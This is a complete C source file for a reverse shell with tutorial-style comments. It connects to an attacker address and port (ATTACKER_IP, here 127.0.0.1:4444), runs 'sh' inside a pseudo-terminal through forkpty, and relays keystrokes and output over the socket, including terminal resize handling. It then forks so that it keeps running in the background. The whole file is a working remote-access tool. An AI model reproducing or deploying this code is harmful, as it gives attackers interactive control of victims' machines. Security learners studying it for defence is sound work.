#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <sys/poll.h>
#include <sys/errno.h>
#include <sys/ioctl.h>

#if defined(__linux__)
    #include <pty.h>
#elif defined(__FreeBSD__)
    #include <libutil.h>
#elif defined(__OpenBSD__) || defined(__NetBSD__) || defined(__APPLE__)
    #include <util.h>
#endif

// IP and port of the attacker's machine
#define ATTACKER_IP "127.0.0.1"
#define ATTACKER_PORT 4444

typedef struct sockaddr_in sockaddr_in;
typedef struct sockaddr sockaddr;
typedef struct pollfd pollfd;
typedef struct winsize winsize;

void monitor_fd(int client_socket, int pty)
{
    // Buffer to temporarily store the
    // data before sending over the network
    char buffer[4096];

    // Create an array of file descriptors
    // that will be used for waiting for
    // input and output
    pollfd fds[2];
    nfds_t nfds = 2;
    
    // Store the amount of data read
    // from the socket (not the data itself)
    ssize_t bytes_read, peek;

    // This marker indicates that we need to update
    // the window size. The attacker will send this
    // marker byte to the victim if the attacker's
    // window size changes
    uint8_t marker = 0xFF;

    // Struct to hold properties of the window size
    winsize ws;

    // Socket FD
    fds[0].fd = client_socket;
    fds[0].events = POLLIN;

    // PTY FD
    fds[1].fd = pty;
    fds[1].events = POLLIN;

    // Keep looping until the attacker
    // ends the session or the connection
    // gets lost
    while (true)
    {
        // Waiting for an event from the
        // file descriptors
        if (poll(fds, nfds, -1) < 0)
        {
            // Check for any interrupts
            // from the OS and ignore them
            if (errno == EINTR) continue;
            perror("poll");
            break;
        }
        
        // Socket -> PTY
        if (fds[0].revents & (POLLIN | POLLHUP))
        {
            // Check if we read 0xFF from the attacker
            // This indicates that we need a window size change
            peek = recv(client_socket, &marker, sizeof(uint8_t), MSG_PEEK);
            if (peek == 1 && marker == 0xFF)
            {
                // Consume the marker byte 0xFF
                read(client_socket, &marker, 1);

                // Once we have consumed the marker byte,
                // we need to now read the data containing
                // the new window size
                if (read(client_socket, &ws, sizeof(ws)) == sizeof(ws))
                {
                    // If the read was successful, we now
                    // apply the new window size to
                    // the PTY
                    ioctl(pty, TIOCSWINSZ, &ws);
                }
                continue;
            }

            // Read data from the socket
            bytes_read = read(client_socket, buffer, sizeof(buffer));

            // Check if we didn't read anything
            // and exit if nothing is read
            if (bytes_read <= 0) break;

            // Write to the PTY we created
            // Exit if we couldn't write to the PTY
            if (write(pty, buffer, (size_t)bytes_read) < 0) break;
        }

        // PTY -> socket
        if (fds[1].revents & (POLLIN | POLLHUP))
        {
            // Read data from the PTY
            bytes_read = read(pty, buffer, sizeof(buffer));

            // Check if we didn't read anything
            // and exit if nothing is read
            if (bytes_read <= 0) break;

            // Write to the socket we created
            // Exit if we couldn't write to the socket
            if (write(client_socket, buffer, (size_t)bytes_read) < 0) break;
        }

        // Check for any error events
        if (fds[0].revents & (POLLERR | POLLNVAL)) break;
        if (fds[1].revents & (POLLERR | POLLNVAL)) break;
    }
}

void create_pty(int client_socket)
{
    // File descriptor used for I/O for PTY
    int pty;

    // Hold pid values for child processes
    pid_t shell_pid, relay_pid;

    // We will now create a PTY device
    // along with a child process
    //
    // pty_fd will hold the PTY device itself
    // shell_pid will hold the child process that runs the shell
    shell_pid = forkpty(&pty, NULL, NULL, NULL);

    // Check if child process creation failed
    if (shell_pid < 0)
    {
        perror("forkpty");
        exit(EXIT_FAILURE);
    }

    // Execute the actual shell program
    // in the child process
    if (shell_pid == 0)
    {
        execlp("sh", "sh", NULL);
        perror("execlp");
        exit(EXIT_FAILURE);
    }

    // The first child is running in the
    // background
    //
    // We want this program as a whole to
    // run in the background
    //
    // What we will do then is create another
    // child process to run the rest of
    // the program
    //
    // Then we will exit the parent and the
    // whole program will run in the
    // background
    
    // Create the second child process
    // that relays data between the socket
    // and the PTY
    relay_pid = fork();

    // Check if child process creation failed
    if (relay_pid < 0)
    {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    // Run rest of the program in the
    // child process
    if (relay_pid == 0)
    {
        monitor_fd(client_socket, pty);
        close(client_socket);
        close(pty);
        waitpid(shell_pid, NULL, 0);
    }

    // Exit the parent process
    if (relay_pid > 0) return;
}

int connect_to_server(const char *ip, const uint16_t port)
{
    // Socket used for network communication
    int client_socket;

    // Struct to hold properties of the socket
    sockaddr_in socket_address;

    // Define properties of the socket
    // Use IPv4 for network communication
    socket_address.sin_family = AF_INET;

    // Convert string representation of
    // IP to an actual number
    socket_address.sin_addr.s_addr = inet_addr(ip);

    // Change the byte order of the integer
    // to network byte order
    socket_address.sin_port = htons(port);

    // Create the socket that will be used
    // to communicate over the network
    // AF_INET -> Use IPv4
    // SOCK_STREAM -> Use connection oriented socket (TCP) (reliable byte stream)
    // IPPROTO_TCP -> Use TCP protocol
    client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (client_socket< 0)
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Connect to the attacker using the socket
    // we just created.
    if (connect(client_socket, (sockaddr*)&socket_address, sizeof(socket_address)) != 0)
    {
        perror("connect");
        exit(EXIT_FAILURE);
    }
    return client_socket;
}

int main(void)
{
    // Connect to the attacker's machine
    // using the IP and port
    int client_socket = connect_to_server(ATTACKER_IP, ATTACKER_PORT);
    create_pty(client_socket);
    return 0;
}
